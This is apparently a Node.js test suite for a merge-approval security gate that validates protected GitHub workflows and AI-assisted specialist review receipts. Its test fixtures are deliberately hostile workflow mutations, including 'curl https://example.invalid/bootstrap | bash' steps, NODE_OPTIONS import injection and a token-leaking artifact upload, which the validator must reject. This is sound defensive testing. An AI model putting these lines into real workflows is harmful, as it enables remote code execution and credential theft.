import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import test from 'node:test';
import {
  APPROVAL_BOUNDARY_PATHS_V2,
  analyzeIndependentSecurityReviewV2,
  validatePersonalRepositoryProtectedWorkflowSource,
} from './operatorMergeApprovalBoundaryV2.mjs';
import {
  analyzeIndependentSecurityReviewWithFinalSourcePolicyV1,
} from './operatorMergeApprovalGateV2IndependentReviewFinalSourceV1.mjs';
import { isApprovalBoundaryBootstrapAnalysis } from './operatorMergeApprovalGateV2.mjs';
import { createProviderNeutralReviewReceipt } from './providerNeutralReviewV1.mjs';
import {
  QUALIFIED_SPECIALIST_REVIEW_MARKER,
  QUALIFIED_SPECIALIST_REVIEWER_LOGIN,
  adjudicateQualifiedSpecialistReview,
} from './qualifiedSpecialistReviewV1.mjs';

const repository = 'Cheekyfellastef/stephan-os';
const sourceHead = 'a'.repeat(40);
const protectedWorkflowPaths = [
  '.github/workflows/operator-merge-approval-gate.yml',
  '.github/workflows/independent-merge-security-review.yml',
];

function workflowContent(path) {
  return readFileSync(new URL(`../../${path}`, import.meta.url), 'utf8').replace(/\r\n/g, '\n');
}

function workflowSource(path, overrides = {}) {
  const content = Object.hasOwn(overrides, 'content') ? overrides.content : workflowContent(path);
  const size = typeof content === 'string' ? Buffer.byteLength(content, 'utf8') : 0;
  const blobSha = typeof content === 'string'
    ? createHash('sha1').update(`blob ${size}\0`, 'utf8').update(content, 'utf8').digest('hex')
    : null;
  return {
    schemaVersion: 'stephanos.protected-workflow-source.v1',
    repository,
    path,
    ref: sourceHead,
    exists: true,
    size,
    blobSha,
    content,
    ...overrides,
  };
}

function workflowEvidence(paths = protectedWorkflowPaths) {
  return {
    repository,
    sourceHead,
    protectedWorkflowSources: paths.map((path) => workflowSource(path)),
  };
}

function diffFor(path, additions) {
  return [
    `diff --git a/${path} b/${path}`,
    `--- a/${path}`,
    `+++ b/${path}`,
    '@@ -1 +1 @@',
    ...additions.map((line) => `+${line}`),
  ].join('\n');
}

function personalRepositoryWorkflowContent() {
  return workflowContent('shared/agents/fixtures/operator-merge-approval-gate.expected.yml');
}
test('classifies every live v2 approval-boundary path', () => {
  assert.deepEqual(APPROVAL_BOUNDARY_PATHS_V2, [
    '.github/workflows/operator-merge-approval-gate.yml',
    '.github/workflows/independent-merge-security-review.yml',
    '.github/workflows/build-stephanos-ui.yml',
    '.github/workflows/pr-clean.yml',
    '.github/workflows/exact-head-review-dispatch.yml',
    '.github/workflows/battle-bridge-publisher-proof.yml',
    '.github/workflows/codex-dispatch-queue-proof.yml',
    '.github/workflows/openclaw-github-operator.yml',
    '.github/workflows/operator-merge-approval-gate-test.yml',
    '.github/workflows/stephanos-deploy.yml',
    'scripts/operator-protected-merge-gate-v2.mjs',
    'scripts/operator-protected-personal-repository-merge.mjs',
    'scripts/independent-merge-security-review-v2.mjs',
    'shared/agents/operatorMergeApprovalGate.mjs',
    'shared/agents/operatorMergeApprovalGateV2.mjs',
    'shared/agents/operatorMergeApprovalBoundaryV2.mjs',
    'shared/agents/operatorMergeBaseBindingV1.mjs',
    'shared/agents/operatorMergeReviewArtifactV1.mjs',
    'shared/agents/operatorPersonalRepositoryMergeV1.mjs',
    'shared/agents/protectedOpenClawMergeMailboxAdapter.mjs',
    'shared/agents/providerNeutralReviewV1.mjs',
    'shared/agents/qualifiedSpecialistReviewV1.mjs',
  ]);
});

test('admits only the exact personal-repository fallback workflow source', () => {
  const path = '.github/workflows/operator-merge-approval-gate.yml';
  const content = personalRepositoryWorkflowContent();
  const exact = {
    changedFiles: [{ filename: path, status: 'modified' }],
    repository,
    sourceHead,
    protectedWorkflowSources: [workflowSource(path, { content })],
  };
  const validation = validatePersonalRepositoryProtectedWorkflowSource(exact);
  assert.equal(validation.valid, true, validation.blockers.join(','));
  assert.match(validation.proofRef, /^proofs\/personal-repository-workflow-source\//);

  for (const altered of [
    content.replace(
      'Collect exact personal-repository evidence after protected admission',
      'Prove exact personal-repository evidence before protected approval',
    ),
    content.replace('    needs: [personal-repository-evidence]\n', ''),
    content.replace(
      '    needs: [personal-repository-evidence, operator-personal-repository-approval]',
      '    needs: [operator-personal-repository-approval]',
    ),
  ]) {
    const stageValidation = validatePersonalRepositoryProtectedWorkflowSource({
      ...exact,
      protectedWorkflowSources: [workflowSource(path, { content: altered })],
    });
    assert.equal(stageValidation.valid, false);
    assert.ok(stageValidation.blockers.includes('personal-repository-workflow-stage-sequence-not-exact'));
  }

  const legacyContent = content.replace(
    'inputs.expected_head || github.run_id',
    "format('PR #{0} at {1}', inputs.pr_number, inputs.expected_head)",
  );
  const legacyValidation = validatePersonalRepositoryProtectedWorkflowSource({
    ...exact,
    protectedWorkflowSources: [workflowSource(path, { content: legacyContent })],
  });
  assert.equal(legacyValidation.valid, false);
  assert.ok(legacyValidation.blockers.includes('personal-repository-workflow-content-digest-not-exact'));

  const analysis = analyzeIndependentSecurityReviewV2({
    ...exact,
    changedFiles: [
      ...exact.changedFiles,
      'scripts/operator-protected-personal-repository-merge.mjs',
      'shared/agents/operatorPersonalRepositoryMergeV1.mjs',
    ],
    diff: [
      diffFor(path, ['workflow_dispatch:']),
      diffFor('scripts/operator-protected-personal-repository-merge.mjs', [
        "await api(`/pulls/${receipt.prNumber}/merge`, { method: 'PUT', body: { merge_method: 'squash', sha: receipt.sourceHead } });",
      ]),
      diffFor('shared/agents/operatorPersonalRepositoryMergeV1.mjs', [
        'return Object.freeze({ exactBaseSha });',
      ]),
    ].join('\n'),
  });
  assert.equal(analysis.findings.some((item) => item.code === 'write-workflow-does-not-use-trusted-source'), false);
  assert.equal(analysis.findings.every((item) => (
    item.code === 'approval-boundary-v2-self-change-requires-qualified-review'
  )), true);
  assert.equal(analysis.findings.length, 3);
  assert.equal(isApprovalBoundaryBootstrapAnalysis(analysis), true);

  let mutationIndex = 0;
  for (const altered of [
    content.replace('  workflow_dispatch:', '  pull_request:\n  workflow_dispatch:'),
    content.replace('ref: ${{ github.sha }}', 'ref: ${{ github.event.pull_request.head.sha }}'),
    content.replace('contents: write', 'contents: read'),
    content.replace(
      '  personal-repository-evidence:\n    name: personal-repository-evidence',
      '  personal-repository-evidence:\n    permissions:\n      contents: write\n    name: personal-repository-evidence',
    ),
    content.replace('      mode:', '      extra_input:\n        required: true\n        type: string\n      mode:'),
    content.replace('        required: true', '        required: false'),
    content.replace('        type: string', '        type: boolean'),
    content.replace('cancel-in-progress: false', 'cancel-in-progress: true'),
    content.replace("github.event_name == 'workflow_dispatch'", "github.event_name == 'merge_group'"),
    content.replace('persist-credentials: false', 'persist-credentials: true'),
    content.replace('permission-administration: write', 'permission-administration: read'),
    content.replace('          permission-administration: write\n', ''),
    content.replace(
      '          permission-administration: write',
      '          permission-administration: write\n          permission-contents: read',
    ),
    content.replace('          owner: ${{ github.repository_owner }}', '          owner: another-owner'),
    content.replace('          repositories: stephan-os', '          repositories: stephan-os, another-repository'),
    content.replace(
      'STEPHANOS_RULESET_PROOF_TOKEN: ${{ steps.ruleset-proof-token.outputs.token }}',
      'STEPHANOS_RULESET_PROOF_TOKEN: ${{ secrets.STEPHANOS_RULESET_PROOF_APP_PRIVATE_KEY }}',
    ),
    content.replace(
      'STEPHANOS_RULESET_PROOF_TOKEN: ${{ steps.ruleset-proof-token.outputs.token }}',
      'STEPHANOS_RULESET_PROOF_TOKEN: ${{ secrets.STEPHANOS_RULESET_PROOF_APP_PRIVATE_KEY }}',
    ).replace(
      '          private-key: ${{ secrets.STEPHANOS_RULESET_PROOF_APP_PRIVATE_KEY }}',
      [
        '          private-key: ${{ secrets.STEPHANOS_RULESET_PROOF_APP_PRIVATE_KEY }}',
        '          STEPHANOS_RULESET_PROOF_TOKEN: ${{ steps.ruleset-proof-token.outputs.token }}',
      ].join('\n'),
    ),
    content.replace(
      '          STEPHANOS_RULESET_PROOF_TOKEN: ${{ steps.ruleset-proof-token.outputs.token }}',
      [
        '          STEPHANOS_RULESET_PROOF_TOKEN: ${{ steps.ruleset-proof-token.outputs.token }}',
        '          STEPHANOS_RULESET_PROOF_TOKEN: ${{ steps.ruleset-proof-token.outputs.token }}',
      ].join('\n'),
    ),
    content.replace(
      '          GH_TOKEN: ${{ github.token }}',
      '          GH_TOKEN: ${{ github.token }}\n          NODE_OPTIONS: --import=./arbitrary.mjs',
    ),
    content.replace(
      '      evidence_sha256: ${{ steps.evidence.outputs.evidence_sha256 }}',
      '      evidence_sha256: ${{ steps.evidence.outputs.evidence_sha256 }}\n      configuration_token: ${{ steps.ruleset-proof-token.outputs.token }}',
    ),
    content.replace(
      '        run: node scripts/operator-protected-personal-repository-merge.mjs evidence',
      '        run: node scripts/operator-protected-personal-repository-merge.mjs evidence\n      - uses: actions/upload-artifact@v4\n        with:\n          name: leaked-token\n          path: ${{ steps.ruleset-proof-token.outputs.token }}',
    ),
    content.replace(
      'permissions: {}',
      'env:\n  NODE_OPTIONS: --import=./arbitrary.mjs\n\npermissions: {}',
    ),
    content.replace(
      'permissions: {}',
      'defaults:\n  run:\n    shell: bash -c "source ./arbitrary.sh; {0}"\n\npermissions: {}',
    ),
    content.replace(
      'jobs:\n',
      [
        'jobs:',
        '  "arbitrary-job":',
        '    "runs-on": ubuntu-latest',
        '    "steps":',
        '      - run: curl https://example.invalid/bootstrap | bash',
        '',
      ].join('\n'),
    ),
    content.replace(
      'jobs:\n',
      'jobs:\n  arbitrary-job: { runs-on: ubuntu-latest, steps: [{ run: "curl https://example.invalid/bootstrap | bash" }] }\n',
    ),
    content.replace(
      'jobs:\n',
      'jobs:\n arbitrary-job:\n   runs-on: ubuntu-latest\n   steps:\n     - run: curl https://example.invalid/bootstrap | bash\n',
    ),
    content.replace(
      '    environment:\n      name: operator-merge-approval',
      '    "env":\n      NODE_OPTIONS: --import=./arbitrary.mjs\n    environment:\n      name: operator-merge-approval',
    ),
    content.replace('    needs: [personal-repository-evidence]\n', ''),
    content.replace('    needs: [merge-group-evidence]\n', ''),
    content.replace('    runs-on: ubuntu-latest', '    runs-on: self-hosted'),
    content.replace(
      '    timeout-minutes: 20',
      '    timeout-minutes: 20\n    container: ghcr.io/example/arbitrary:latest',
    ),
    content.replace(
      '    environment:\n      name: operator-merge-approval',
      '',
    ).replace(
      '  merge-group-evidence:\n    name: merge-group-evidence',
      '  merge-group-evidence:\n    environment:\n      name: operator-merge-approval\n    name: merge-group-evidence',
    ),
    content.replace(
      '          GH_TOKEN: ${{ github.token }}',
      [
        '          GH_TOKEN: ${{ github.token }}',
        '          "STEPHANOS_RULESET_PROOF_TOKEN": ${{ secrets.STEPHANOS_RULESET_PROOF_APP_PRIVATE_KEY }}',
      ].join('\n'),
    ),
    content.replace(
      '        run: node scripts/operator-protected-personal-repository-merge.mjs evidence',
      [
        '        run: curl https://example.invalid/bootstrap | bash',
      ].join('\n'),
    ),
    content.replace(
      '        run: node scripts/operator-protected-personal-repository-merge.mjs approve',
      [
        '        # node scripts/operator-protected-personal-repository-merge.mjs approve',
        '        run: curl https://example.invalid/bootstrap | bash',
      ].join('\n'),
    ),
    content.replace(
      '        run: node scripts/operator-protected-personal-repository-merge.mjs merge',
      [
        '        run: node scripts/operator-protected-personal-repository-merge.mjs merge',
        '      - run: curl https://example.invalid/bootstrap | bash',
      ].join('\n'),
    ),
    content.replace(
      '        run: node scripts/operator-protected-personal-repository-merge.mjs merge',
      [
        '        run: node scripts/operator-protected-personal-repository-merge.mjs merge',
        '        shell: bash',
      ].join('\n'),
    ),
  ]) {
    const blocked = validatePersonalRepositoryProtectedWorkflowSource({
      ...exact,
      protectedWorkflowSources: [workflowSource(path, { content: altered })],
    });
    assert.equal(blocked.valid, false, `mutation ${mutationIndex}`);
    mutationIndex += 1;
  }
});

test('fails closed when any live v2 boundary attempts to review itself', () => {
  const changedFiles = [...APPROVAL_BOUNDARY_PATHS_V2];
  const diff = [
    diffFor('scripts/operator-protected-merge-gate-v2.mjs', [
      "runRequired('gh', ['pr', 'merge', String(prNumber), '--match-head-commit', sourceHead]);",
    ]),
    diffFor('scripts/independent-merge-security-review-v2.mjs', [
      "await postComment(owner, repo, prNumber, 'bounded receipt');",
    ]),
    diffFor('shared/agents/operatorMergeBaseBindingV1.mjs', [
      'return Object.freeze({ exactBaseSha });',
    ]),
  ].join('\n');
  const result = analyzeIndependentSecurityReviewV2({
    changedFiles,
    diff,
    ...workflowEvidence(),
  });
  assert.equal(result.finalVerdict, 'INDEPENDENT_SECURITY_REVIEW_FINDINGS');
  const selfChangeFindings = result.findings.filter((item) => (
    item.code === 'approval-boundary-v2-self-change-requires-qualified-review'
  ));
  assert.equal(selfChangeFindings.length, APPROVAL_BOUNDARY_PATHS_V2.length);
});

test('valid final exact-head workflow source prevents hunk-only false trust findings', () => {
  const path = '.github/workflows/independent-merge-security-review.yml';
  const finalContent = workflowContent(path).replace('timeout-minutes: 15', 'timeout-minutes: 16');
  const result = analyzeIndependentSecurityReviewWithFinalSourcePolicyV1({
    changedFiles: [{ filename: path, status: 'modified' }],
    diff: diffFor(path, ['timeout-minutes: 16']),
    repository,
    sourceHead,
    protectedWorkflowSources: [workflowSource(path, { content: finalContent })],
  });
  assert.equal(result.findings.filter((item) => (
    item.code === 'approval-boundary-v2-self-change-requires-qualified-review'
  )).length, 1);
  assert.equal(result.findings.some((item) => item.code === 'independent-review-workflow-not-trusted'), false);
  assert.equal(isApprovalBoundaryBootstrapAnalysis(result), true);
});

test('deleted or renamed-away protected workflows cannot pass bootstrap-only review', () => {
  const path = '.github/workflows/independent-merge-security-review.yml';
  const missingSource = workflowSource(path, {
    exists: false,
    size: 0,
    blobSha: null,
    content: null,
  });
  for (const [changedFiles, diff] of [
    [[{ filename: path, status: 'removed' }], [
      `diff --git a/${path} b/${path}`,
      'deleted file mode 100644',
      `--- a/${path}`,
      '+++ /dev/null',
      '@@ -1 +0,0 @@',
      '-name: Independent Merge Security Review',
    ].join('\n')],
    [[{
      filename: '.github/workflows/independent-review-untrusted.yml',
      previous_filename: path,
      status: 'renamed',
    }], [
      `diff --git a/${path} b/.github/workflows/independent-review-untrusted.yml`,
      'similarity index 100%',
      `rename from ${path}`,
      'rename to .github/workflows/independent-review-untrusted.yml',
    ].join('\n')],
  ]) {
    const result = analyzeIndependentSecurityReviewV2({
      changedFiles,
      diff,
      repository,
      sourceHead,
      protectedWorkflowSources: [missingSource],
    });
    assert.ok(result.findings.some((item) => item.code === 'protected-workflow-final-source-missing'));
    assert.equal(isApprovalBoundaryBootstrapAnalysis(result), false);
  }
});

test('protected workflow evidence is bound to exact ref, size, blob and least-authority permissions', () => {
  const path = '.github/workflows/independent-merge-security-review.yml';
  const changedFiles = [{ filename: path, status: 'modified' }];
  const diff = diffFor(path, ['timeout-minutes: 16']);
  for (const source of [
    workflowSource(path, { ref: 'b'.repeat(40) }),
    workflowSource(path, { size: 1 }),
    workflowSource(path, { blobSha: 'c'.repeat(40) }),
  ]) {
    const result = analyzeIndependentSecurityReviewV2({
      changedFiles,
      diff,
      repository,
      sourceHead,
      protectedWorkflowSources: [source],
    });
    assert.ok(result.findings.some((item) => item.code === 'protected-workflow-source-evidence-invalid'));
    assert.equal(isApprovalBoundaryBootstrapAnalysis(result), false);
  }

  const excessiveAuthority = workflowContent(path).replace('pull-requests: read', 'pull-requests: write');
  const permissionResult = analyzeIndependentSecurityReviewV2({
    changedFiles,
    diff,
    repository,
    sourceHead,
    protectedWorkflowSources: [workflowSource(path, { content: excessiveAuthority })],
  });
  assert.ok(permissionResult.findings.some((item) => item.code === 'independent-review-workflow-not-trusted'));
  assert.ok(permissionResult.findings.some((item) => item.code === 'independent-reviewer-has-source-authority'));
  assert.equal(isApprovalBoundaryBootstrapAnalysis(permissionResult), false);
});

test('failed independent reviews still publish immutable findings evidence', () => {
  const workflow = workflowContent('.github/workflows/independent-merge-security-review.yml');
  assert.match(workflow, /Upload the exact-run immutable independent review result[\s\S]*?if: \$\{\{ always\(\) \}\}[\s\S]*?actions\/upload-artifact@v4/);
  const reviewer = readFileSync(new URL('../../scripts/independent-merge-security-review-v2.mjs', import.meta.url), 'utf8');
  const findingsBranch = reviewer.slice(
    reviewer.indexOf("if (analysis.finalVerdict !== 'INDEPENDENT_SECURITY_REVIEW_CLEAN'"),
    reviewer.indexOf('const artifact = buildIndependentReviewArtifact'),
  );
  assert.ok(findingsBranch.indexOf('buildIndependentReviewFindingsArtifact') >= 0);
  assert.ok(findingsBranch.indexOf('writeReviewArtifact(artifact)') > findingsBranch.indexOf('buildIndependentReviewFindingsArtifact'));
  assert.ok(findingsBranch.indexOf('throw new Error') > findingsBranch.indexOf('writeReviewArtifact(artifact)'));
});

test('protects the live v2 policy engine and wrapper from clean self-attestation', () => {
  for (const path of [
    'shared/agents/operatorMergeApprovalBoundaryV2.mjs',
    'shared/agents/operatorMergeApprovalGateV2.mjs',
  ]) {
    const result = analyzeIndependentSecurityReviewV2({
      changedFiles: [path],
      diff: diffFor(path, ['export const secure = false;']),
    });
    assert.ok(result.findings.some((item) => (
      item.code === 'approval-boundary-v2-self-change-requires-qualified-review'
      && item.path === path
    )));
  }
});

test('classifies both sides of a GitHub rename so protected paths cannot be renamed away', () => {
  const protectedPath = 'shared/agents/operatorMergeApprovalGate.mjs';
  const renamedPath = 'shared/agents/operatorMergeApprovalGate-untrusted.mjs';
  const result = analyzeIndependentSecurityReviewV2({
    changedFiles: [{
      filename: renamedPath,
      previous_filename: protectedPath,
      status: 'renamed',
    }],
    diff: [
      `diff --git a/${protectedPath} b/${renamedPath}`,
      `similarity index 100%`,
      `rename from ${protectedPath}`,
      `rename to ${renamedPath}`,
    ].join('\n'),
  });
  assert.ok(result.findings.some((item) => (
    item.code === 'approval-boundary-v2-self-change-requires-qualified-review'
    && item.path === protectedPath
  )));
});

test('rejects specialist-review synthesis in the live v2 operator executor', () => {
  const path = 'scripts/operator-protected-merge-gate-v2.mjs';
  const result = analyzeIndependentSecurityReviewV2({
    changedFiles: [path],
    diff: diffFor(path, ['buildProtectedSecurityReviewReceipt({ sourceHead });']),
  });
  assert.ok(result.findings.some((item) => item.code === 'operator-v2-synthesizes-review'));
});

test('rejects new live v2 merge authority without exact-head protection', () => {
  const path = 'scripts/operator-protected-merge-gate-v2.mjs';
  const result = analyzeIndependentSecurityReviewV2({
    changedFiles: [path],
    diff: diffFor(path, ["runRequired('gh', ['pr', 'merge', String(prNumber)]);"]),
  });
  assert.ok(result.findings.some((item) => item.code === 'operator-v2-exact-head-guard-missing'));
});

test('rejects mutation authority in the live v2 independent reviewer', () => {
  const path = 'scripts/independent-merge-security-review-v2.mjs';
  const result = analyzeIndependentSecurityReviewV2({
    changedFiles: [path],
    diff: diffFor(path, ["runRequired('gh', ['pr', 'merge', String(prNumber)]);"]),
  });
  assert.ok(result.findings.some((item) => item.code === 'independent-reviewer-v2-gained-mutation-authority'));

  const boundedRead = analyzeIndependentSecurityReviewV2({
    changedFiles: [path],
    diff: diffFor(path, [
      'await githubRequest(`/repos/${owner}/${repo}/contents/${encodedPath}?ref=${sourceHead}`);',
    ]),
  });
  assert.equal(boundedRead.findings.some((item) => (
    item.code === 'independent-reviewer-v2-gained-mutation-authority'
  )), false);

  const contentMutation = analyzeIndependentSecurityReviewV2({
    changedFiles: [path],
    diff: diffFor(path, [
      'await githubRequest(`/repos/${owner}/${repo}/contents/${encodedPath}`, { method: "PUT" });',
    ]),
  });
  assert.ok(contentMutation.findings.some((item) => (
    item.code === 'independent-reviewer-v2-gained-mutation-authority'
  )));
});

test('rejects command authority in the exact-base binding module', () => {
  const path = 'shared/agents/operatorMergeBaseBindingV1.mjs';
  const result = analyzeIndependentSecurityReviewV2({
    changedFiles: [path],
    diff: diffFor(path, ["import { spawnSync } from 'node:child_process';"]),
  });
  assert.ok(result.findings.some((item) => item.code === 'base-binding-module-gained-command-authority'));
});

function specialistAnalysis(paths = ['scripts/windows/start-stephanos-backend.ps1']) {
  const findings = paths.map((path) => ({
    severity: 'P0',
    code: 'unsupported-high-risk-surface',
    summary: 'Separate specialist review required.',
    path,
  }));
  return {
    schemaVersion: 'stephanos.independent-security-analysis.v1',
    findings,
    counts: { P0: findings.length, P1: 0, P2: 0 },
    verdict: 'findings',
    proofRefs: paths.map((path) => `proofs/changed-file/${path}`),
    finalVerdict: 'INDEPENDENT_SECURITY_REVIEW_FINDINGS',
  };
}

function specialistReceipt(paths, overrides = {}) {
  const head = sourceHead;
  const base = 'b'.repeat(40);
  return createProviderNeutralReviewReceipt({
    receiptId: 'specialist-pr-1638-a',
    repository,
    issueNumber: 1568,
    prNumber: 1638,
    branch: 'fix/battle-bridge-recovery-health-authority',
    sourceHead: head,
    reviewerId: 'chatgpt-github-specialist',
    reviewerClass: 'external-qualified',
    provider: 'chatgpt-github-specialist',
    modelClass: 'gpt-5-6-thinking',
    reviewerSessionId: `github-specialist-${head.slice(0, 12)}`,
    implementerProvider: 'canonical-programme-builder',
    implementerSessionId: 'pr-1638-implementation-lane',
    riskTier: 'high',
    assuranceMode: 'specialist',
    reviewScope: ['complete-exact-head-diff', 'windows-authority-specialist', 'fixed-executable-and-task-authority'],
    findings: [],
    verdict: 'clean',
    timestampUtc: '2026-08-06T12:00:00.000Z',
    proofRefs: [
      `proofs/specialist-review/head-${head.slice(0, 12)}`,
      `proofs/specialist-review/base-${base.slice(0, 12)}`,
      ...paths.map((path) => `proofs/specialist-review/path/${path}`),
    ],
    quorumChecks: [],
    blocker: '',
    ...overrides,
  });
}

function specialistReview(receipt, overrides = {}) {
  return {
    id: 91001,
    state: 'APPROVED',
    commit_id: sourceHead,
    submitted_at: '2026-08-06T12:01:00.000Z',
    user: { login: QUALIFIED_SPECIALIST_REVIEWER_LOGIN },
    body: `${QUALIFIED_SPECIALIST_REVIEW_MARKER}\n\n\`\`\`json\n${JSON.stringify(receipt)}\n\`\`\``,
    ...overrides,
  };
}

test('exact app-authored specialist approval seals only Windows escalation findings', () => {
  const paths = ['scripts/windows/start-stephanos-backend.ps1'];
  const result = adjudicateQualifiedSpecialistReview({
    analysis: specialistAnalysis(paths),
    codexRequired: true,
    reviews: [specialistReview(specialistReceipt(paths))],
    repository,
    prNumber: 1638,
    branch: 'fix/battle-bridge-recovery-health-authority',
    sourceHead,
    baseSha: 'b'.repeat(40),
  });
  assert.equal(result.required, true);
  assert.equal(result.valid, true);
  assert.equal(result.analysis.finalVerdict, 'INDEPENDENT_SECURITY_REVIEW_CLEAN');
  assert.deepEqual(result.analysis.findings, []);
  assert.match(result.analysis.proofRefs.join(' '), /specialist-review\/review-91001/);
});

test('specialist approval fails closed on stale head, wrong app, missing path coverage and non-escalation findings', () => {
  const paths = ['scripts/windows/start-stephanos-backend.ps1'];
  const receipt = specialistReceipt(paths);
  for (const review of [
    specialistReview(receipt, { commit_id: 'c'.repeat(40) }),
    specialistReview(receipt, { user: { login: 'Cheekyfellastef' } }),
    specialistReview(specialistReceipt([])),
  ]) {
    const result = adjudicateQualifiedSpecialistReview({
      analysis: specialistAnalysis(paths),
      codexRequired: true,
      reviews: [review],
      repository,
      prNumber: 1638,
      branch: 'fix/battle-bridge-recovery-health-authority',
      sourceHead,
      baseSha: 'b'.repeat(40),
    });
    assert.equal(result.valid, false);
    assert.equal(result.blockers.includes('qualified-specialist-review-missing'), true);
  }

  const mixed = specialistAnalysis(paths);
  mixed.findings.push({ severity: 'P1', code: 'real-defect', summary: 'Must repair.', path: 'x.mjs' });
  mixed.counts.P1 = 1;
  const result = adjudicateQualifiedSpecialistReview({
    analysis: mixed,
    codexRequired: true,
    reviews: [specialistReview(receipt)],
    repository,
    prNumber: 1638,
    branch: 'fix/battle-bridge-recovery-health-authority',
    sourceHead,
    baseSha: 'b'.repeat(40),
  });
  assert.equal(result.required, false);
  assert.equal(result.valid, false);
});

test('trusted reviewer fetches exact PR reviews and seals only through the specialist adjudicator', () => {
  const source = readFileSync(new URL('../../scripts/independent-merge-security-review-v2.mjs', import.meta.url), 'utf8');
  assert.match(source, /pulls\/\$\{prNumber\}\/reviews/);
  assert.match(source, /adjudicateQualifiedSpecialistReview/);
  assert.match(source, /SPECIALIST_REVIEW_DECISION/);
  assert.doesNotMatch(source, /gh\s+pr\s+(?:merge|ready)/);
});
